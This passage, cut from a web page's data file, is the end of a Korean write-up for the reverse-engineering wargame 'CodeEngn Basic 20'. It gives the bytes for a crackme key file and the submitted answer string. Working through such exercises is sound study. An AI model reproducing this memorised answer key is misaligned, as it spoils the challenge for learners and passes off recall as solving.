CRACKME3.KEY에 들어갈 문자열의 아스키 코드 16진수 값은 아래와 같다.\r\n02 2D 27 21 00 28 20 26 49 ?? ?? ?? ?? ?? 7B 55 34 12</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 400px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.60606060606061%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABnUlEQVR42k3PzW7TQBAHcL8YQo1E+RAnBISKp+AVKo4IDqVN1Z5RVYkKeAAkcKPaXrdNkzg5UNvr1oqd2E7WdsruZj9REoH4aTSay8zob/j+4e3t96qmWTYpigKhUkq5t7v79Mmj11vNl8+fvWq+aG41G42Njfv3/tXjzQebDxtGmg7reoIx5ZzrFaWU5/Vt23Jd4ALn/Ny9cIF1dmbbFnBs27La7VMXgG9fvhqzWX13h7Msq+dzSgmhBCGU5/nqClNKccYJJkJIISQlhFGmpNRa30SRUUyLsiyrqirLEiFUVdV4nI7HGVtUvR9vsgR2e/1erz8cDAeDweVl5wK4cTzSWkMYGtPpdL25Vtf1ZEVrOZ9BzqiUSgjBOZdSKrWcGWPLzzeRkef57D8IlWmaxHEshGRcLRhb/EWXqQjnHGMshLi+/mUQSrTWchVjjXNeFAUhBOPfeK1ettFoFARB+7QNYRQEged5xtGn4/fvPhwcHuzv77VaH3d2Wtvbb09OPidJ4vt+GIYhDMMshBHsXnUBAKZpOo7T6VyZ5s8/Vp+WkjQ8tgMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/886453b6d860edfc7633b1fc04785ff2/c9b55/26.webp 165w,\n/static/886453b6d860edfc7633b1fc04785ff2/f2908/26.webp 330w,\n/static/886453b6d860edfc7633b1fc04785ff2/7f61c/26.webp 400w\"\n              sizes=\"(max-width: 400px) 100vw, 400px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/886453b6d860edfc7633b1fc04785ff2/04c57/26.png 165w,\n/static/886453b6d860edfc7633b1fc04785ff2/d9ecf/26.png 330w,\n/static/886453b6d860edfc7633b1fc04785ff2/e17e5/26.png 400w\"\n            sizes=\"(max-width: 400px) 100vw, 400px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/886453b6d860edfc7633b1fc04785ff2/e17e5/26.png\"\n            alt=\"cracked\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>제출한 정답: 022D27210028202649DEADBEEF007B553412</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"a157c370-0da9-54f3-8722-7154190cca2c","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-20/","title":"CodeEngn Basic 20","readingTime":{"text":"14 min read"}}]}},"staticQueryHashes":["1094019748","460736852"],"slicesMap":{}}